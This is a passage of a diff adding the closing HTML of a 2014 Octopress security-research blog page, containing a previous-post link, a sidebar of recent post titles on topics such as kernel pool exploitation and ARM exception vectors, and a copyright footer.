+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/" title="Previous Post: Deep dive into Python's VM: Story of LOAD_CONST bug">&laquo; Deep dive into Python's VM: Story of LOAD_CONST bug</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/04/30/corrupting-arm-evt/">Corrupting the ARM Exception Vector Table</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">Deep dive into Python's VM: Story of LOAD_CONST bug</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/">First dip into the kernel pool : MS10-058</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/10/12/having-a-look-at-the-windows-userkernel-exceptions-dispatcher/">Having a look at the Windows' User/Kernel exceptions dispatcher</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution/">Breaking Kryptonite's obfuscation: a static analysis approach relying on symbolic execution</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 -  Axel Souchet, Jonathan Salwan, Jérémy Fetiveau <br/>
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> + <a href="https://github.com/ioveracker/mnml">mnml</a>.
+	  
+  </span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
